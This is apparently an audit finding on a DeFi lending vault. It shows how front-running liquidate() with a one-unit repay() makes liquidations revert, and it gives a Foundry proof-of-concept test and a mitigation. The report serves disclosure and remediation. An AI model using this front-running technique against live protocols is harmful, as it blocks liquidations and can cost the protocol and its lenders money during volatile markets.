# Liquidation DoS through dust repayments

## Summary
An attacker by front-running any `liquidate()` call can prevent successful liquidation by making it revert. 
By preventing liquidations the gains of the protocol can be diminished using relatively low cost, 
especially during volatile price movements.

## Vulnerability Detail
The problem lies in the following condition inside the `liquidate()` function in the `V3Vault.sol`:

```solidity
uint256 debtShares = loans[params.tokenId].debtShares;
        if (debtShares != params.debtShares) {
            revert DebtChanged();
        }
```

The `liquidate()` function requires that the caller puts the exact amount of debt that he intends to liquidate, 
that amount must equal the actual debt of a loan. An attacker can front-run the `liquidate()` transaction with a `repay()` 
and repay minimum amount of assets so that at least `debtShares` is reduced by 1.

## Proof of Conecpt
A test to see the behaviour:
```solidity
    function testLiquidationFrontRun() external {
        address FRONT_RUNNER = 0xF977814e90Da44bfa03b6295a0616A897441bAcA;

        vm.prank(WHALE_ACCOUNT);
        USDC.transfer(FRONT_RUNNER, 1000);

        // approve front runner to vault for repay()
        vm.prank(FRONT_RUNNER);
        USDC.approve(address(vault), 100);

        _setupBasicLoan(true);

        // wait 7 days for interest to grow
        vm.warp(block.timestamp + 7 days);

        (,,, uint256 liquidationCost,) = vault.loanInfo(TEST_NFT);
        (uint256 debtShares) = vault.loans(TEST_NFT);
        vm.prank(WHALE_ACCOUNT);
        USDC.approve(address(vault), liquidationCost);

        vm.prank(FRONT_RUNNER);
        vault.repay(TEST_NFT, 1, true);

        vm.expectRevert(IErrors.DebtChanged.selector);
        vm.prank(WHALE_ACCOUNT);
        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));
    }
```

## Recommended Mitigation Steps
Recommendation is to remove the above condition completely and the debtShares from LiquidateParams. 
Liquidation should always liquidate the entire available debt.
